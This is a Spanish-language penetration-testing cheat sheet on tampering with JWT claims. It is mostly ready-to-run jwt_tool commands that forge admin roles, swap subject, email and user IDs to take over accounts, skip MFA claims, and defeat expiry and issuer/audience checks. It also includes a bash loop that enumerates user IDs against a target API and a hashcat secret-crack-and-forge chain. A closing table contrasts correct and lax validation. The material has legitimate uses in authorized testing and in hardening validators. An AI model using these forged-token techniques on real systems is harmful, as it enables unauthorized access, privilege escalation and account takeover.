---
aliases:
  - JWT Claims Tampering
  - JWT Privilege Escalation
  - JWT Account Takeover
tags:
  - type/technique
  - vuln/jwt
  - vuln/auth-bypass
  - technique/privilege-escalation
  - asset/web-app
  - cred/jwt
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[JWT Attacks]]"
---
# JWT - Manipulación de Claims

***

## Privilege Escalation

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `python3 jwt_tool.py $JWT -T` (interactive tamper) y modificar `isAdmin` / `role` / `permissions` | Modify claims interactivamente y resign | Tools-driven workflow. |
| `python3 jwt_tool.py $JWT -I -pc role -pv admin` | Inject claim role=admin con resign | Auto-modify single claim. |
| `python3 jwt_tool.py $JWT -I -pc isAdmin -pv true` | Set isAdmin=true | Boolean flag privesc. |
| `python3 jwt_tool.py $JWT -I -pc roles -pv '["admin","user"]'` | Set array roles | Roles array privesc. |
| `python3 jwt_tool.py $JWT -I -pc permissions -pv '["*"]'` | Wildcard permissions | RBAC bypass. |
| `python3 jwt_tool.py $JWT -I -pc scope -pv 'admin read write'` | OAuth scope privesc | Space-separated scopes. |
| `python3 jwt_tool.py $JWT -I -pc plan -pv enterprise` | Paywall bypass | Tier/plan field. |
| `python3 jwt_tool.py $JWT -I -pc tenant_id -pv victim_tenant` | Cross-tenant pivot | Multi-tenant lateral. |
| `python3 jwt_tool.py $JWT -I -pc groups -pv '["admins","users"]'` | LDAP-style group inject | Stack AD/LDAP. |
| `echo $JWT \| cut -d. -f2 \| base64 -d \| jq 'keys'` | Lista claims actuales para identificar candidates | Pre-attack recon. |
^jwt-claims-privesc

### Identificación de claims sensibles

```bash
# Decodificar payload + listar all keys
echo "$JWT" | cut -d. -f2 | base64 -d 2>/dev/null | jq 'keys'

# Buscar claims sospechosos
echo "$JWT" | cut -d. -f2 | base64 -d 2>/dev/null | jq | grep -iE 'admin|role|priv|scope|perm|access|tier|plan|tenant'
```

___

## Account Takeover

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `python3 jwt_tool.py $JWT -I -pc sub -pv 'victim@target.com'` | Subject swap | Backend identifica user por sub claim. |
| `python3 jwt_tool.py $JWT -I -pc user_id -pv 1337` | user_id swap (numeric IDOR-style) | Backend identifica por user_id. |
| `python3 jwt_tool.py $JWT -I -pc email -pv 'admin@target.com'` | Email swap | Backend confía en email del JWT. |
| `python3 jwt_tool.py $JWT -I -pc username -pv admin` | Username swap | Variante de sub. |
| `python3 jwt_tool.py $JWT -I -pc id -pv 1` | DB-style ID hijack | Stack legacy. |
| `python3 jwt_tool.py $JWT -I -pc mfa_verified -pv true` | Skip MFA via claim | Stack que checkea MFA por claim. |
| Bash loop forge + verify: `for i in 1 2 3 admin root; do ...; done` (ver code block) | Bulk ID enumeration | IDs desconocidos. |
| Forjar JWT victim → request `/password-reset` con header Authorization | Atacante recibe reset link | Backend usa JWT como auth para reset. |
^jwt-claims-takeover

### Bash loop ID enumeration

```bash
for i in 1 2 3 1000 1337 admin root administrator; do
  FORGED=$(python3 jwt_tool.py "$JWT" -I -pc user_id -pv "$i" -X a 2>/dev/null | grep -oE 'eyJ[^\s]+\.[^\s]+\.[^\s]*')
  RESP=$(curl -s -H "Authorization: Bearer $FORGED" https://target/api/me)
  echo "user_id=$i: $RESP"
done
```

___

## Bypass de Validación Temporal

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `python3 jwt_tool.py $JWT -I -pc exp -pv 9999999999` | Token válido hasta año 2286 | Persistence post-crack secret. |
| `python3 jwt_tool.py $JWT -I -pc exp -pv 0` | Algunos libs interpretan 0 como "no expiration" | Type-confusion variant. |
| `python3 jwt_tool.py $JWT -I -pc nbf -pv 0` | Not-before en epoch — token usable desde siempre | nbf check bypass. |
| `python3 jwt_tool.py $JWT -I -pc iat -pv 1` | iat falso — bypass freshness checks | Stack que valida iat. |
| `python3 jwt_tool.py $JWT -I -pc exp -pv '"99999"'` (string) | Type confusion exp | Parser fail-open en mismatch. |
| Forjar JWT sin claim exp (delete) | Algunos validators tratan ausente como infinito | Validator fail-open. |
| Reutilizar `jti` del token original en nuevo token | Replay si no hay tracking server-side | jti tracking ausente. |
^jwt-claims-temporal

### Workflow chain con secret crack

```bash
# 1. Token válido user normal (exp 5 min)
JWT="capture_via_proxy"

# 2. Crack secret HS256
hashcat -m 16500 jwt.txt rockyou.txt
# Secret recovered: e.g. "weaksecret"

# 3. Forge nuevo token con exp 10 años + role=admin
python3 -c "
import jwt
print(jwt.encode({
    'sub':'me',
    'role':'admin',
    'exp': 9999999999
}, 'weaksecret', algorithm='HS256'))
"
```

___

## Bypass iss / aud

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `python3 jwt_tool.py $JWT -I -pc iss -pv 'https://accounts.google.com'` | Spoof issuer | Validator multi-IdP sin key separation. |
| `python3 jwt_tool.py $JWT -I -pc aud -pv 'https://api.victim.com'` | Audience swap | Validator no enforce audience. |
| `python3 jwt_tool.py $JWT -I -pc aud -pv '["legit","victim"]'` | Array audience inject | aud array forms. |
| `python3 jwt_tool.py $JWT -I -pc aud -pv '*'` | Wildcard audience | Glob-match validator. |
| Eliminar `iss`/`aud` del payload (delete claim) | Validators fail-open con claim ausente | Defense gap. |
| `python3 jwt_tool.py $JWT -I -pc iss -pv 'https://attacker.target.com'` | Subdomain issuer bypass | Prefix-match validation. |
| Forge JWT con `iss` propio + `jku` al JWKS atacante | Cross-issuer attack chain | Combine con header injection. |
^jwt-claims-iss-aud

### Validación correcta vs laxa (referencia)

| Check | Correcto | Laxo (vulnerable) |
|---|---|---|
| `iss` | String literal trusted | Ignora / startsWith |
| `aud` | String/array exacto | startsWith / regex |
| `exp` | now() + skew ≤ 60s | Skew enorme / ignora |
| `nbf` | Compara con now() | Ignora |
| `jti` | DB tracking (replay protection) | No hay tracking |

***
